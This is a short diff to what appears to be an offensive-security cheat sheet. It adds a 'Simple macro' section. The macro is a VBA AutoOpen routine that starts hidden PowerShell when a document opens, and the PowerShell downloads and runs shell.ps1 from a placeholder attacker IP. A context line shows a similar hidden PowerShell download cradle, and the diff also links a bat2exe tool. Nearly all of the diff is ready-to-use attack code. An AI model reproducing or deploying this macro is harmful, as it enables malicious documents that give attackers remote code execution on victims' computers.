@@ -184,3 +184,13 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX
 ## bat2exe
 - https://github.com/islamadel/bat2exe/releases/tag/2.0
 
+## Simple macro
+```
+Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>/shell.ps1'))"""
+
+End Sub
+```
